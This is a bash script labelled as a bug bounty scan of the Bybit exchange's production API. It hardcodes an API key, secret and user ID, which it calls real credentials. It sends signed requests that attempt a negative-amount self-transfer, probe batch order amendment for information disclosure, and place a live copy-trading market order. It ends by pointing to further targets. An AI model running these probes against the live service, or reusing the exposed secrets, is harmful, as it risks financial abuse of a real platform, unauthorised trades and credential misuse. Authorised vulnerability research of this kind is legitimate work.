#!/bin/bash
# FINAL COMPREHENSIVE TEST (NOV 24, 2025)
# Using REAL credentials to test ALL viable vectors

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
MY_UID="527465456"
BASE="https://api.bybit.com"

# Sync Time
echo "[*] Syncing time..."
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
LOCAL_TIME=$(date +%s)
OFFSET=$((SERVER_TIME - LOCAL_TIME))
echo "Time offset: ${OFFSET}s"

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

echo ""
echo "============================================================"
echo "FINAL BUG BOUNTY SCAN - BYBIT (24 NOV 2025)"
echo "Account: $MY_UID"
echo "============================================================"

# TEST 1: Account Permissions Check
echo ""
echo "=== TEST 1: ACCOUNT PERMISSIONS ==="
IFS='|' read -r ts sig <<< $(sign "")
perms=$(curl -s "$BASE/v5/user/query-api" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000")

echo "Response: $perms"
perm_code=$(echo "$perms" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)

if [ "$perm_code" == "0" ]; then
    echo "✓ Auth working"
    echo "Permissions: $(echo "$perms" | grep -o '"permissions":{[^}]*}')"
else
    echo "✗ Auth failed: $perm_code"
fi

# TEST 2: Inter-Transfer Logic Flaw (10016 Bug)
echo ""
echo "=== TEST 2: INTER-TRANSFER 10016 BUG ==="
UUID=$(cat /proc/sys/kernel/random/uuid)
PAYLOAD="{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"-100\",\"fromMemberId\":$MY_UID,\"toMemberId\":$MY_UID}"
IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")

transfer_resp=$(curl -s -X POST "$BASE/v5/asset/transfer/inter-transfer" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD")

echo "Response: $transfer_resp"
transfer_code=$(echo "$transfer_resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)

if [ "$transfer_code" == "10016" ]; then
    echo "✓ 10016 CONFIRMED (Improper Error Handling)"
    echo "Severity: Low/Medium (Not exploitable for funds)"
elif [ "$transfer_code" == "0" ]; then
    echo "🚨 CRITICAL: Transfer succeeded with negative amount!"
else
    echo "Code: $transfer_code"
fi

# TEST 3: Batch Order Info Disclosure (110001)
echo ""
echo "=== TEST 3: BATCH ORDER INFO DISCLOSURE ==="
BATCH_PAYLOAD='{"category":"linear","request":[{"symbol":"BTCUSDT","orderId":"fake-id-test","qty":"0.001"}]}'
IFS='|' read -r ts sig <<< $(sign "$BATCH_PAYLOAD")

batch_resp=$(curl -s -X POST "$BASE/v5/order/amend-batch" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$BATCH_PAYLOAD")

echo "Response: $batch_resp"

if echo "$batch_resp" | grep -q "110001"; then
    echo "✓ 110001 CONFIRMED (Order Not Found before Permission Check)"
    echo "Severity: Low (Information Disclosure)"
else
    echo "No info disclosure detected"
fi

# TEST 4: Copy Trading (Ghost Fees)
echo ""
echo "=== TEST 4: COPY TRADING GHOST FEES ==="
COPY_PAYLOAD='{"category":"linear","symbol":"BTCUSDT","side":"Buy","orderType":"Market","qty":"0.001","isCopyTrading":true}'
IFS='|' read -r ts sig <<< $(sign "$COPY_PAYLOAD")

copy_resp=$(curl -s -X POST "$BASE/v5/order/create" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$COPY_PAYLOAD")

echo "Response: $copy_resp"
copy_code=$(echo "$copy_resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)

if [ "$copy_code" == "10024" ]; then
    echo "✗ BLOCKED: KYC/Regulatory restriction"
elif [ "$copy_code" == "0" ]; then
    echo "🚨 CRITICAL: Order created! Check for ghost fees"
else
    echo "Code: $copy_code"
fi

# SUMMARY
echo ""
echo "============================================================"
echo "SCAN COMPLETE - SUMMARY"
echo "============================================================"
echo ""
echo "CONFIRMED FINDINGS:"
echo "1. ✓ 10016 Internal Error (inter-transfer) - Low/Medium"
echo "2. ✓ 110001 Info Disclosure (batch orders) - Low"
echo ""
echo "BLOCKED VECTORS:"
echo "- Copy Trading: KYC restriction (10024)"
echo "- Real Order Creation: Regulatory block"
echo ""
echo "EXPLOITABLE: No critical vulnerabilities found with current access."
echo "RECOMMENDATION: Focus on P2P mobile app or get KYC-verified account."
echo "============================================================"
